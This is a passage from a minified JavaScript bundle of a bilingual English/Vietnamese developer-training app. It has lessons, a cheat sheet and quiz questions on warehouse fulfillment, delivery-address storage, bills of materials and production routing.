VI: Mã HS phân loại chính hàng hóa, không phải nhà cung cấp. Hãy lưu nó trên sản phẩm. Sai mã có thể dẫn đến sai thuế và vướng mắc với hải quan.`}]},{id:"logistics.warehouse",title:"Warehouse fulfillment · Xử lý đơn tại kho",summary:`Receive, put away, pick, pack and ship before the cut-off.
VI: Nhận hàng, cất lên kệ, lấy hàng, đóng gói và giao trước giờ chốt.`,minutes:5,blocks:[{type:"diagram",text:`INBOUND (nhập)        OUTBOUND (xuất)
Truck arrives         Order arrives
  ↓                     ↓
Receive + check       Pick (lấy hàng)
  ↓                     ↓
Putaway (cất kệ)      Pack (đóng gói)
  ↓                     ↓
Bin A-03-2 ──stock──► Ship (bàn giao)

Cross-dock:
Truck in ──────────────────► Truck out
  (no putaway, hours not days)`},{type:"text",text:`**Putaway** means placing received goods in a storage spot called a **bin**, like A-03-2. The worker scans the bin and the item. Then the system knows exactly where the stock is.
VI: **Putaway** là cất hàng đã nhận vào một vị trí lưu trữ gọi là **bin** (ô kệ), ví dụ A-03-2. Nhân viên quét mã ô kệ và mã hàng. Nhờ vậy hệ thống biết chính xác hàng nằm ở đâu.`},{type:"text",text:`**Cross-docking** moves goods from the inbound truck to an outbound truck with little or no storage. It saves space and time. It needs exact timing between trucks.
VI: **Cross-docking** là chuyển hàng từ xe nhập sang xe xuất mà gần như không lưu kho. Cách này tiết kiệm diện tích và thời gian. Nó đòi hỏi giờ xe đến và đi phải khớp chính xác.`},{type:"diagram",text:`Single:  O1 ─walk─► O2 ─walk─► O3
         3 walks through the shelves

Batch:   O1 + O2 + O3 in one walk
           ↓
         sort table → O1 | O2 | O3

Wave:    13:00 release all orders
         for the 15:00 truck pickup`},{type:"list",items:[`**Single order picking**: one picker, one order. Simple, but a lot of walking.
VI: **Lấy theo từng đơn**: một người lấy một đơn. Đơn giản nhưng đi lại nhiều.`,`**Batch picking**: one walk collects items for many orders. They are sorted after.
VI: **Lấy gộp**: một lượt đi lấy hàng cho nhiều đơn, sau đó chia lại theo đơn.`,`**Wave picking**: release a group of orders at a set time, for example per carrier pickup.
VI: **Lấy theo đợt**: thả một nhóm đơn vào giờ định sẵn, ví dụ theo giờ hãng đến lấy hàng.`]},{type:"text",text:`The **cut-off time** is a promise like "paid before 14:00, shipped today". It must leave enough time before the carrier pickup. Store it per warehouse and carrier, not in code.
VI: **Giờ chốt đơn** là cam kết như "thanh toán trước 14:00 thì giao cho hãng trong ngày". Phải chừa đủ thời gian trước giờ hãng đến lấy. Hãy lưu theo từng kho và từng hãng, không ghi cứng trong code.`},{type:"code",code:{lang:"ts",text:`// paidAt must be in warehouse local time
function promisedShipDate(
  paidAtLocal: Date, cutoffHour: number,
): Date {
  const d = new Date(paidAtLocal);
  if (d.getHours() >= cutoffHour) {
    d.setDate(d.getDate() + 1);
  }
  // skip Sundays and public holidays
  return nextWorkingDay(d);
}`}},{type:"example",title:"Flash sale day",text:`On a sale day, a shop gets 10,000 orders by noon. Three carriers pick up at 15:00, 17:00 and 19:00. The warehouse runs one wave per pickup. Each wave holds only orders for that carrier.
VI: Ngày sale, một shop nhận 10.000 đơn trước buổi trưa. Ba hãng đến lấy hàng lúc 15:00, 17:00 và 19:00. Kho chạy một đợt lấy hàng cho mỗi giờ lấy. Mỗi đợt chỉ gồm đơn của hãng đó.`}],remember:`Scan every move into a bin, pick in batches or waves, and plan backwards from the carrier pickup.
VI: Quét mã mọi lần cất hàng vào ô kệ, lấy hàng gộp hoặc theo đợt, và lập kế hoạch ngược từ giờ hãng đến lấy.`,questions:[{id:"logistics.warehouse.1",kind:"compare",difficulty:"medium",prompt:`There are 500 small orders. Each has 1–2 items from the same 20 popular products. Which picking method is usually best?
VI: Có 500 đơn nhỏ. Mỗi đơn 1–2 món từ cùng 20 sản phẩm bán chạy. Cách lấy hàng nào thường tốt nhất?`,choices:["Single order: one walk per order","Batch: one walk for many orders, then sort","Cross-dock: send them straight to the truck"],answer:1,why:`The same few products repeat across many orders. One walk can collect them all, which saves a lot of walking. Cross-docking is for inbound goods, not for picking stock.
VI: Cùng vài sản phẩm lặp lại trong rất nhiều đơn. Một lượt đi có thể lấy đủ, đỡ đi lại rất nhiều. Cross-docking dành cho hàng vừa nhập, không phải để lấy hàng tồn.`},{id:"logistics.warehouse.2",kind:"debug",difficulty:"hard",prompt:`The cut-off is 14:00 Vietnam time. Orders paid between 14:00 and 21:00 still promise "ships today". The server runs in UTC. Why?
VI: Giờ chốt là 14:00 giờ Việt Nam. Đơn thanh toán từ 14:00 đến 21:00 vẫn hứa "giao trong ngày". Máy chủ chạy giờ UTC. Vì sao?`,code:{lang:"ts",text:`const paid = new Date(order.paidAtUtc);
if (paid.getHours() >= 14) {
  // ship tomorrow
}`},choices:["getHours() reads UTC hours, not Vietnam hours","The check should use > instead of >= for 14:00","new Date() cannot parse a UTC date string","The cut-off hour was not loaded from settings"],answer:0,why:`On a UTC server, 15:00 in Vietnam is 08:00 UTC, so the check sees 8 and says "today". Convert to the warehouse time zone before comparing with the cut-off.
VI: Trên máy chủ UTC, 15:00 giờ Việt Nam là 08:00 UTC, nên điều kiện thấy 8 và báo "hôm nay". Hãy đổi sang múi giờ của kho trước khi so với giờ chốt.`,remember:"Compare cut-offs in the warehouse’s local time."},{id:"logistics.warehouse.3",kind:"mcq",difficulty:"easy",prompt:`What is cross-docking?
VI: Cross-docking là gì?`,choices:["Moving goods from inbound to outbound with little storage","Counting stock in two warehouses at the same time","Packing two orders into one box to save on shipping","Moving stock from one shelf to another every night"],answer:0,why:`Goods arrive and leave again quickly, without a normal putaway. It is common for stores that get daily deliveries from a central hub.
VI: Hàng đến rồi đi ngay, không cất kệ như bình thường. Cách này hay dùng cho các cửa hàng nhận hàng hằng ngày từ kho trung tâm.`},{id:"logistics.warehouse.4",kind:"scenario",difficulty:"medium",prompt:`The system says bin A-03-2 has 20 units. Pickers often find it empty, and the goods are on another shelf. Which rule fixes this?
VI: Hệ thống báo ô A-03-2 có 20 cái. Người lấy hàng thường thấy ô trống, còn hàng lại nằm ở kệ khác. Quy tắc nào khắc phục việc này?`,choices:[`Scan both the bin and the item at every putaway
VI: Quét cả mã ô kệ và mã hàng mỗi lần cất hàng`,`Count the whole warehouse once a year
VI: Kiểm kê toàn kho mỗi năm một lần`,`Let pickers choose any bin that has free space
VI: Cho người lấy hàng chọn ô nào còn chỗ trống`],answer:0,why:`The stock is real but the location is wrong. Scanning the bin at putaway makes the system record where the goods really went. A yearly count finds the problem far too late.
VI: Hàng có thật nhưng vị trí bị sai. Quét mã ô kệ khi cất giúp hệ thống ghi đúng chỗ hàng được đặt. Kiểm kê mỗi năm thì phát hiện quá trễ.`}]},{id:"logistics.addresses",title:"Addresses and locations · Địa chỉ và vị trí",summary:`Messy text, structured fields, and place names that change.
VI: Địa chỉ gõ lộn xộn, trường có cấu trúc, và tên địa danh thay đổi.`,minutes:5,blocks:[{type:"text",text:`Customers type addresses in many ways. "123 Lê Lợi, Q1, HCM" and "123 le loi quan 1 tphcm" are the same place. A system that only stores free text cannot route, price or report well.
VI: Khách gõ địa chỉ theo nhiều kiểu. "123 Lê Lợi, Q1, HCM" và "123 le loi quan 1 tphcm" là cùng một nơi. Hệ thống chỉ lưu chữ tự do thì khó lập tuyến, tính cước hay làm báo cáo.`},{type:"diagram",text:`Text as typed (keep it):
"12 ngõ 5 Láng Hạ, Đống Đa, HN"
          │ parse + customer confirms
          ▼
┌───────────┬──────────────────────┐
│ Line1     │ 12 ngõ 5 Láng Hạ     │
│ WardCode  │ (ward / commune)     │
│ Province  │ Hà Nội               │
│ Lat, Lng  │ 21.0…, 105.8…        │
│ Phone     │ 09xx xxx xxx         │
└───────────┴──────────────────────┘`},{type:"text",text:`**Geocoding** turns address text into map coordinates (latitude and longitude). Route planning needs them. Geocoding can be wrong, so let the customer drop a pin on the map, and let the driver correct it.
VI: **Geocoding** là chuyển địa chỉ dạng chữ thành tọa độ trên bản đồ (vĩ độ, kinh độ). Lập tuyến cần tọa độ này. Geocoding có thể sai, nên cho khách ghim vị trí trên bản đồ và cho tài xế sửa lại.`},{type:"text",text:`Administrative units change. In 2025 Vietnam merged its provinces, from 63 to 34, and removed the district level. Many wards and communes were also merged and renamed. So do not hard-code the list.
VI: Đơn vị hành chính có thể thay đổi. Năm 2025, Việt Nam sáp nhập tỉnh từ 63 xuống 34 và bỏ cấp huyện. Nhiều phường, xã cũng được sáp nhập và đổi tên. Vì vậy đừng ghi cứng danh sách này trong code.`},{type:"diagram",text:`Before mid-2025       From mid-2025
Province (63)         Province (34)
 └ District            (no district)
    └ Ward/Commune      └ Ward/Commune
       └ Street            └ Street`},{type:"code",code:{lang:"sql",text:`CREATE TABLE AdminUnits (
  Code       VARCHAR(10) PRIMARY KEY,
  Name       NVARCHAR(100) NOT NULL,
  Level      VARCHAR(10) NOT NULL,
  ParentCode VARCHAR(10) NULL,
  ValidFrom  DATE NOT NULL,
  ValidTo    DATE NULL,    -- NULL = in use
  ReplacedBy VARCHAR(10) NULL -- after merge
);
-- On the order: a copy, not only a link
-- ShipToText NVARCHAR(500)  as typed
-- ShipToWardCode, ShipToProvinceCode
-- ShipToLat, ShipToLng`}},{type:"example",title:"The reprinted delivery note",text:`In 2026 a customer asks for a copy of a 2024 delivery note. The system rebuilds the address from today’s ward table. The copy shows a ward name that did not exist in 2024. Keep the address text that was on the order.
VI: Năm 2026, khách xin bản sao phiếu giao hàng năm 2024. Hệ thống dựng lại địa chỉ từ bảng phường xã hiện tại. Bản sao hiện tên phường chưa hề có vào năm 2024. Hãy giữ nguyên địa chỉ đã ghi trên đơn.`},{type:"text",text:`Ask the business: which address format do our carriers accept now? How do we report sales by region across the change? Do old documents need the old address?
VI: Cần hỏi nghiệp vụ: các hãng vận chuyển hiện nhận địa chỉ theo định dạng nào? Báo cáo doanh số theo vùng trước và sau thay đổi thế nào? Chứng từ cũ có cần giữ địa chỉ cũ không?`}],remember:`Keep the address as it was on the order, plus structured codes. Load place names from data, never from code.
VI: Giữ địa chỉ đúng như trên đơn, kèm các mã có cấu trúc. Lấy danh sách địa danh từ dữ liệu, không ghi cứng trong code.`,questions:[{id:"logistics.addresses.1",kind:"scenario",difficulty:"medium",prompt:`The checkout has a province dropdown built from a hard-coded enum of 63 provinces. After the 2025 change, what is the best fix?
VI: Trang thanh toán có danh sách tỉnh lấy từ một enum ghi cứng 63 tỉnh. Sau thay đổi năm 2025, cách sửa tốt nhất là gì?`,choices:[`Edit the enum to 34 provinces and deploy again
VI: Sửa enum thành 34 tỉnh rồi deploy lại`,`Load units from a table with valid-from and valid-to dates
VI: Lấy danh sách từ bảng có ngày hiệu lực từ và đến`,`Remove the dropdown and accept only free text
VI: Bỏ danh sách chọn, chỉ cho gõ chữ tự do`,`Keep 63 provinces and let carriers sort it out
VI: Giữ 63 tỉnh và để hãng vận chuyển tự xử lý`],answer:1,why:`A new enum works until the next change, and it loses the old units that old orders still use. A table with validity dates handles both, without a deploy.
VI: Enum mới chỉ dùng được đến lần thay đổi sau, và mất các đơn vị cũ mà đơn hàng cũ vẫn dùng. Bảng có ngày hiệu lực xử lý được cả hai, không cần deploy.`},{id:"logistics.addresses.2",kind:"debug",difficulty:"medium",prompt:"A reprinted 2024 invoice shows a ward name that only exists since 2025. The order table stores only `WardCode`. What is the cause?\nVI: Hóa đơn năm 2024 in lại hiện tên phường chỉ có từ năm 2025. Bảng đơn hàng chỉ lưu `WardCode`. Nguyên nhân là gì?",choices:[`The printer template uses the wrong font for Vietnamese
VI: Mẫu in dùng sai font tiếng Việt`,`The name is looked up from today’s data, not stored
VI: Tên được tra từ dữ liệu hiện tại, không được lưu lại`,`The ward code was typed wrong by the customer
VI: Khách gõ sai mã phường`],answer:1,why:`With only a code, the name always comes from the current master data. Store the address text on the order too, as it was at that time.
VI: Chỉ lưu mã thì tên luôn lấy từ danh mục hiện tại. Hãy lưu thêm địa chỉ dạng chữ trên đơn, đúng như lúc đặt hàng.`},{id:"logistics.addresses.3",kind:"truefalse",difficulty:"easy",prompt:`If an address is valid, geocoding always returns the exact location of the door.
VI: Nếu địa chỉ hợp lệ, geocoding luôn trả về đúng vị trí cửa nhà.`,choices:["True","False"],answer:1,why:`Geocoding often returns only the street or the ward center, especially for alleys. Let the customer pin the spot and let drivers correct it.
VI: Geocoding thường chỉ trả về con đường hoặc trung tâm phường, nhất là với địa chỉ trong hẻm, ngõ. Hãy cho khách ghim vị trí và cho tài xế sửa lại.`},{id:"logistics.addresses.4",kind:"compare",difficulty:"medium",prompt:`How should an order store the delivery address?
VI: Đơn hàng nên lưu địa chỉ giao hàng thế nào?`,choices:[`One free-text field only
VI: Chỉ một trường chữ tự do`,`Only codes that link to the admin units table
VI: Chỉ các mã liên kết tới bảng đơn vị hành chính`,`The text as typed plus structured codes and lat/lng
VI: Chữ như khách gõ, kèm mã có cấu trúc và tọa độ`],answer:2,why:`Free text alone is hard to route and report. Codes alone change meaning when units merge. Keeping both gives history and structure.
VI: Chỉ có chữ thì khó lập tuyến và báo cáo. Chỉ có mã thì ý nghĩa thay đổi khi sáp nhập. Lưu cả hai thì vừa giữ lịch sử vừa có cấu trúc.`}]}],cheatSheet:[{title:"Shipment and status",items:[{term:"Shipment · Kiện hàng giao",meaning:`The real box that moves; one order can have several.
VI: Thùng hàng thật sự di chuyển; một đơn có thể có nhiều kiện.`},{term:"Tracking number · Mã vận đơn",meaning:`The carrier’s id for one parcel.
VI: Mã của hãng để theo dõi một kiện hàng.`},{term:"Delivery failed · Giao thất bại",meaning:`The attempt did not work; retry or return.
VI: Lần giao không thành; giao lại hoặc chuyển hoàn.`},{term:"Return to sender · Chuyển hoàn",meaning:`The carrier brings an undelivered parcel back.
VI: Hãng mang kiện không giao được về lại cho shop.`},{term:"POD · Bằng chứng giao hàng",meaning:`Photo, signature or OTP that shows delivery.
VI: Ảnh, chữ ký hoặc mã OTP chứng minh đã giao.`},{term:"COD · Thu hộ",meaning:`The driver collects cash; the carrier pays the shop later.
VI: Tài xế thu tiền mặt; hãng chuyển trả cho shop sau.`}]},{title:"Cost",items:[{term:"Volumetric weight · Trọng lượng quy đổi",meaning:`L × W × H / divisor; the divisor is set by the carrier.
VI: Dài × rộng × cao / hệ số chia; hệ số do hãng quy định.`},{term:"Chargeable weight · Khối lượng tính cước",meaning:`The bigger of actual and volumetric weight.
VI: Số lớn hơn giữa cân thật và trọng lượng quy đổi.`},{term:"Zone · Vùng",meaning:`Distance group used in the rate table.
VI: Nhóm khoảng cách dùng trong bảng giá cước.`},{term:"3PL · Logistics bên thứ ba",meaning:`An outside company that stores, packs and ships for you.
VI: Công ty ngoài lưu kho, đóng gói và giao hàng giúp bạn.`},{term:"COD reconciliation · Đối soát COD",meaning:`Match each parcel’s COD with the carrier statement.
VI: Khớp tiền COD từng kiện với bảng kê của hãng.`}]},{title:"Events and data",items:[{term:"Webhook",meaning:`The carrier calls your URL when something happens.
VI: Hãng gọi vào URL của bạn khi có sự kiện.`},{term:"Polling",meaning:`You call the carrier API every few minutes.
VI: Bạn gọi API của hãng vài phút một lần.`},{term:"Idempotent",meaning:`Handling the same event twice changes nothing more.
VI: Xử lý cùng một sự kiện hai lần không thay đổi thêm gì.`},{term:"OccurredAt · Thời điểm xảy ra",meaning:`Decide the status by when it happened, not when it arrived.
VI: Chọn trạng thái theo lúc xảy ra, không theo lúc nhận.`},{term:"Status mapping · Ánh xạ trạng thái",meaning:`Carrier codes → your own statuses, kept in a table.
VI: Mã của hãng → trạng thái của mình, lưu trong bảng.`},{term:"Address snapshot · Địa chỉ lưu trên đơn",meaning:`Keep the address text as it was on the order.
VI: Giữ nguyên địa chỉ dạng chữ như lúc đặt hàng.`}]},{title:"Trade and warehouse",items:[{term:"EXW",meaning:`Buyer takes the goods at the seller’s door and all the risk from there.
VI: Người mua nhận hàng tại cơ sở người bán và chịu mọi rủi ro từ đó.`},{term:"FOB",meaning:`Seller pays until the goods are on board; buyer pays the sea freight.
VI: Người bán chịu đến khi hàng lên tàu; người mua trả cước biển.`},{term:"CIF",meaning:`Seller pays freight and insurance; risk moves when on board.
VI: Người bán trả cước và bảo hiểm; rủi ro chuyển khi hàng lên tàu.`},{term:"DDP",meaning:`Seller pays everything, including import duty, to the buyer’s door.
VI: Người bán chịu mọi chi phí, kể cả thuế nhập khẩu, đến tận nơi người mua.`},{term:"HS code · Mã HS",meaning:`International goods code; it decides the duty rate.
VI: Mã phân loại hàng hóa quốc tế; quyết định thuế suất.`},{term:"Cross-docking",meaning:`Inbound truck to outbound truck, with little storage.
VI: Từ xe nhập sang xe xuất, gần như không lưu kho.`},{term:"Cut-off time · Giờ chốt đơn",meaning:`Orders before this time ship the same day.
VI: Đơn trước giờ này được giao cho hãng trong ngày.`},{term:"Wave picking · Lấy hàng theo đợt",meaning:`Release groups of orders at set times, for example per pickup.
VI: Thả từng nhóm đơn vào giờ định sẵn, ví dụ theo giờ hãng lấy hàng.`}]}]},z=Object.freeze(Object.defineProperty({__proto__:null,default:_},Symbol.toStringTag,{value:"Module"})),Q={id:"manufacturing",group:"domain",title:"Manufacturing",emoji:"🏭",tagline:`Turn materials into products, on time and with good quality.
VI: Biến nguyên vật liệu thành sản phẩm, đúng hạn và đạt chất lượng.`,lessons:[{id:"manufacturing.bom",title:"Bill of materials (BOM) · Định mức nguyên vật liệu",summary:`The recipe: which parts, how many, and since when.
VI: Công thức sản phẩm: cần vật tư gì, bao nhiêu và áp dụng từ ngày nào.`,minutes:4,blocks:[{type:"text",text:`A **bill of materials** (BOM) is the recipe of a product. It lists every component and the quantity needed for one unit.
VI: **BOM** (định mức nguyên vật liệu) là công thức của sản phẩm. Nó liệt kê từng vật tư và số lượng cần cho một đơn vị sản phẩm.`},{type:"diagram",text:`Bicycle (1 pc)                level 0
├── Frame          x1         level 1
├── Wheel          x2         level 1
│   ├── Rim        x1         level 2
│   ├── Spoke      x36        level 2
│   └── Tire       x1         level 2
└── Bolt M6        x8         level 1

1 bicycle = 2 wheels x 36 = 72 spokes`},{type:"text",text:`Each line has a **quantity per**: how many of the component one parent unit needs. The wheel is also made in-house, so it has its own BOM. That is a **multi-level BOM**.
VI: Mỗi dòng có **quantity per** (định mức cho một đơn vị cấp cha). Bánh xe cũng tự sản xuất nên có BOM riêng. Đó là **BOM nhiều cấp**.`},{type:"example",title:"Plastic cover at an injection molding plant",text:`One cover uses 50 g of resin plus 1 g of color pigment. Some resin is lost in runners (plastic channels cut off after molding) and in test shots. So the BOM adds a **scrap factor** of 4%: 50 g × 1.04 = 52 g. For 10,000 covers, the plan needs 520 kg of resin, not 500 kg.
VI: Một nắp nhựa dùng 50 g hạt nhựa và 1 g hạt màu. Một phần nhựa bị hao ở đường dẫn nhựa (runner) bị cắt bỏ và các lần bắn thử. Vì vậy BOM cộng thêm **tỷ lệ hao hụt** 4%: 50 g × 1,04 = 52 g. Với 10.000 nắp, kế hoạch cần 520 kg nhựa chứ không phải 500 kg.`},{type:"diagram",text:`BomHeader
 Item     Ver  ValidFrom   Status
 COVER-A  2    2026-07-01  Active

BomLine (parent = COVER-A, ver 2)
 Component  QtyPer  Uom  Scrap%
 RESIN-PP   50      g    4
 PIGMENT-B  1       g    4`},{type:"text",text:`BOMs change. Engineering swaps a part or changes a color. So keep **versions** with **effective dates** (valid from, valid to). Never edit an old version in place. Past orders and cost reports still need it.
VI: BOM luôn thay đổi. Phòng kỹ thuật đổi linh kiện hoặc đổi màu. Vì vậy cần lưu **phiên bản** kèm **ngày hiệu lực** (từ ngày, đến ngày). Không sửa đè lên phiên bản cũ. Các lệnh cũ và báo cáo giá thành vẫn cần nó.`},{type:"list",items:[`Ask: which date picks the BOM version, the order date or the production start date?
VI: Hỏi: ngày nào quyết định phiên bản BOM, ngày tạo lệnh hay ngày bắt đầu sản xuất?`,`Ask: does a released order keep its BOM when a new version starts?
VI: Hỏi: lệnh đã phát hành có giữ BOM cũ khi phiên bản mới có hiệu lực không?`,`Ask: the BOM uses grams, but purchasing buys 25 kg bags. Where is the unit conversion kept?
VI: Hỏi: BOM tính theo gam, mua hàng tính theo bao 25 kg. Quy đổi đơn vị lưu ở đâu?`]}],remember:`BOM = recipe: quantity per, scrap factor, version and effective date.
VI: BOM = công thức: định mức, tỷ lệ hao hụt, phiên bản và ngày hiệu lực.`,questions:[{id:"manufacturing.bom.1",kind:"mcq",difficulty:"easy",prompt:`A bicycle needs 2 wheels. Each wheel needs 36 spokes. How many spokes do 50 bicycles need?
VI: Một xe đạp cần 2 bánh. Mỗi bánh cần 36 nan hoa. 50 xe đạp cần bao nhiêu nan hoa?`,choices:["1,800","3,600","72","7,200"],answer:1,why:`Multiply down the tree: 50 bikes × 2 wheels × 36 spokes = 3,600. If you skip the wheel level, you get 1,800.
VI: Nhân dọc theo cây: 50 xe × 2 bánh × 36 nan = 3.600. Nếu bỏ qua cấp bánh xe, bạn sẽ ra 1.800.`},{id:"manufacturing.bom.2",kind:"code",difficulty:"medium",prompt:"What does `resinKg(10000)` return?\nVI: `resinKg(10000)` trả về bao nhiêu?",code:{lang:"ts",text:`const qtyPer = 50;   // g resin per cover
const scrapPct = 4;  // %

function resinKg(covers: number) {
  const g = covers * qtyPer * (1 + scrapPct / 100);
  return g / 1000;
}`},choices:["500","480","520","504"],answer:2,why:`10,000 × 50 g × 1.04 = 520,000 g = 520 kg. The scrap factor adds 4% on top of the net quantity.
VI: 10.000 × 50 g × 1,04 = 520.000 g = 520 kg. Tỷ lệ hao hụt cộng thêm 4% vào số lượng tịnh.`},{id:"manufacturing.bom.3",kind:"scenario",difficulty:"medium",prompt:`Engineering creates BOM version 3 for COVER-A, valid from 1 August. Order PO-881 was released on 25 July with version 2. What should the system usually do?
VI: Kỹ thuật tạo BOM phiên bản 3 cho COVER-A, hiệu lực từ 1/8. Lệnh PO-881 đã phát hành ngày 25/7 với phiên bản 2. Hệ thống thường nên làm gì?`,choices:[`Keep version 2 on PO-881, and use version 3 for new orders
VI: Giữ phiên bản 2 cho PO-881, lệnh mới dùng phiên bản 3`,`Switch PO-881 to version 3 at once, without telling anyone
VI: Đổi ngay PO-881 sang phiên bản 3, không báo ai`,`Delete version 2, because only one version may exist
VI: Xóa phiên bản 2, vì chỉ được có một phiên bản`,`Block version 3 until every open order is finished
VI: Khóa phiên bản 3 đến khi mọi lệnh đang mở xong hết`],answer:0,why:`Material for PO-881 may already be issued with version 2. A silent switch makes stock and cost wrong. If the business wants a switch, make it a clear user action.
VI: Vật tư cho PO-881 có thể đã xuất theo phiên bản 2. Đổi ngầm sẽ làm sai tồn kho và giá thành. Nếu nghiệp vụ muốn đổi, hãy làm thành thao tác rõ ràng của người dùng.`},{id:"manufacturing.bom.4",kind:"debug",difficulty:"hard",prompt:`For every order, the plan says 10 kg of pigment, but the line really uses about 10.4 kg. Resin numbers match the plan. What is the most likely cause?
VI: Lệnh nào kế hoạch cũng ghi 10 kg hạt màu, nhưng thực tế chuyền dùng khoảng 10,4 kg. Số liệu nhựa thì khớp. Nguyên nhân khả dĩ nhất là gì?`,choices:[`The pigment BOM line has no scrap factor
VI: Dòng BOM hạt màu chưa có tỷ lệ hao hụt`,`The resin BOM line uses the wrong unit
VI: Dòng BOM nhựa dùng sai đơn vị tính`,`MRP does not count open purchase orders
VI: MRP không tính các đơn mua đang mở`,`The orders were released one day too early
VI: Các lệnh được phát hành sớm một ngày`],answer:0,why:`Resin matches, so the calculation works. Pigment is lost together with the resin, about 4% more each time. The pigment line is missing its scrap factor.
VI: Nhựa khớp nên phép tính vẫn đúng. Hạt màu hao hụt cùng với nhựa, mỗi lần dư khoảng 4%. Dòng hạt màu đang thiếu tỷ lệ hao hụt.`}]},{id:"manufacturing.routing",title:"Routing and work centers · Quy trình công nghệ và công đoạn",summary:`The steps: where each step runs and how long it takes.
VI: Các bước làm: mỗi công đoạn chạy ở đâu và mất bao lâu.`,minutes:4,blocks:[{type:"text",text:`The BOM says **what** goes in. The **routing** says **how** it is made: a list of steps called **operations**.
VI: BOM cho biết cần **những gì**. **Routing** (quy trình công nghệ) cho biết làm **như thế nào**: một danh sách các bước gọi là **công đoạn**.`},{type:"text",text:`Each operation runs at a **work center**. That is one machine, or a group of machines or people doing the same job.
VI: Mỗi công đoạn chạy tại một **work center** (tổ máy, chuyền). Đó là một máy, hoặc một nhóm máy hay nhóm người làm cùng một việc.`},{type:"diagram",text:`Routing: COVER-A (painted cover)

Op 10      Op 20      Op 30      Op 40
┌──────┐   ┌──────┐   ┌──────┐   ┌──────┐
│Mold  │──►│Trim  │──►│Paint │──►│Pack  │
│IM-03 │   │HAND-1│   │PNT-1 │   │PACK-1│
└──────┘   └──────┘   └──────┘   └──────┘
setup 60   setup 0    setup 30   setup 10
run 0.5    run 0.2    run 0.3    run 0.1
(minutes; run time is per piece)`},{type:"text",text:`**Setup time** happens once per batch: change the mold, heat it, check the first piece. **Run time** is spent on every piece. Total time = setup + quantity × run time.
VI: **Setup time** (thời gian chuẩn bị) tính một lần cho mỗi lô: thay khuôn, gia nhiệt, kiểm tra sản phẩm đầu tiên. **Run time** (thời gian chạy) tính trên từng sản phẩm. Tổng thời gian = chuẩn bị + số lượng × thời gian chạy.`},{type:"code",code:{lang:"text",text:`Op 10 Mold, 1,000 covers
  setup   60 min
  run     1,000 x 0.5 min = 500 min
  total   560 min  (about 9.3 hours)`}},{type:"example",title:"Why planners dislike small batches",text:`A customer wants 1,000 covers in 4 deliveries of 250. If the plant molds 4 separate batches, the mold is changed 4 times. That is 240 minutes of setup instead of 60. Mold once and hold stock, or mold 4 times and hold less stock. That is a business choice.
VI: Khách cần 1.000 nắp, giao 4 lần, mỗi lần 250. Nếu nhà máy ép 4 lô riêng thì phải thay khuôn 4 lần. Tức là 240 phút chuẩn bị thay vì 60 phút. Ép một lần rồi để tồn kho, hay ép 4 lần để giảm tồn kho? Đó là quyết định của nghiệp vụ.`},{type:"list",items:["`Routing`: item, version, valid from.\nVI: `Routing`: mã hàng, phiên bản, ngày hiệu lực.","`RoutingOperation`: op number, work center, setup minutes, run minutes per unit.\nVI: `RoutingOperation`: số công đoạn, tổ máy, phút chuẩn bị, phút chạy cho mỗi đơn vị.","`WorkCenter`: number of machines, shift calendar, cost per hour.\nVI: `WorkCenter`: số máy, lịch ca làm việc, chi phí mỗi giờ.",`Ask: is run time per piece, per shot or per 100 pieces? A mold with 2 cavities makes 2 pieces per shot.
VI: Hỏi: thời gian chạy tính theo sản phẩm, theo lần ép hay theo 100 sản phẩm? Khuôn 2 lòng khuôn cho ra 2 sản phẩm mỗi lần ép.`]}],remember:`Routing = steps + work centers. Time = setup once + run time × quantity.
VI: Routing = các công đoạn + nơi làm. Thời gian = chuẩn bị một lần + thời gian chạy × số lượng.`,questions:[{id:"manufacturing.routing.1",kind:"code",difficulty:"easy",prompt:`The order is 1,000 pieces, split into 2 batches. What does this call return?
VI: Lệnh 1.000 sản phẩm, chia thành 2 lô. Lời gọi này trả về bao nhiêu?`,code:{lang:"ts",text:`function totalMin(qty: number, batches: number) {
  const setup = 60;  // min per batch
  const run = 0.5;   // min per piece
  return batches * setup + qty * run;
}
totalMin(1000, 2);`},choices:["560","1,120","500","620"],answer:3,why:`Setup happens per batch: 2 × 60 = 120. Run time is 1,000 × 0.5 = 500. Total is 620 minutes, 60 more than one batch.
VI: Chuẩn bị tính theo lô: 2 × 60 = 120. Thời gian chạy là 1.000 × 0,5 = 500. Tổng 620 phút, nhiều hơn 60 phút so với chạy một lô.`},{id:"manufacturing.routing.2",kind:"truefalse",difficulty:"medium",prompt:`If you double the quantity of an order, the total time of each operation also doubles.
VI: Nếu tăng gấp đôi số lượng của lệnh, tổng thời gian của mỗi công đoạn cũng tăng gấp đôi.`,choices:["True","False"],answer:1,why:`Only run time grows with quantity. Setup time stays the same for one batch. So 2,000 pieces take less than twice the time of 1,000.
VI: Chỉ thời gian chạy tăng theo số lượng. Thời gian chuẩn bị giữ nguyên cho một lô. Vì vậy 2.000 sản phẩm mất ít hơn gấp đôi thời gian của 1.000.`},{id:"manufacturing.routing.3",kind:"debug",difficulty:"medium",prompt:`The system says Op 10 for 1,000 covers takes 1,060 minutes. The shop floor says about 560. The mold has 2 cavities. What is the most likely data problem?
VI: Hệ thống báo Op 10 cho 1.000 nắp mất 1.060 phút. Xưởng nói chỉ khoảng 560 phút. Khuôn có 2 lòng khuôn. Lỗi dữ liệu khả dĩ nhất là gì?`,choices:[`Run time per shot was entered as run time per piece
VI: Thời gian mỗi lần ép bị nhập thành thời gian mỗi sản phẩm`,`Setup time was counted twice for the same order
VI: Thời gian chuẩn bị bị tính hai lần cho cùng một lệnh`,`The work center calendar has the wrong shifts
VI: Lịch ca của tổ máy bị khai báo sai`,`The BOM scrap factor was added to the run time
VI: Tỷ lệ hao hụt của BOM bị cộng vào thời gian chạy`],answer:0,why:`1,000 × 1.0 + 60 = 1,060. One shot takes 1.0 minute but makes 2 pieces, so one piece is 0.5 minute. Agree on the unit of run time with the business.
VI: 1.000 × 1,0 + 60 = 1.060. Một lần ép mất 1,0 phút nhưng ra 2 sản phẩm, nên mỗi sản phẩm là 0,5 phút. Cần thống nhất đơn vị của thời gian chạy với nghiệp vụ.`},{id:"manufacturing.routing.4",kind:"scenario",difficulty:"hard",prompt:`Op 20 (trimming) can run on machine TRIM-1 or by hand at HAND-1. The routing allows only one work center, and HAND-1 is full. What should the developer ask the business?
VI: Op 20 (cắt bavia) có thể chạy trên máy TRIM-1 hoặc làm tay ở HAND-1. Routing chỉ cho phép một tổ máy, và HAND-1 đã kín việc. Developer nên hỏi nghiệp vụ điều gì?`,choices:[`Can we delete Op 20, since the covers look fine without it?
VI: Có thể bỏ Op 20 không, vì nắp trông vẫn ổn?`,`Can an operation have alternative work centers, with their own times?
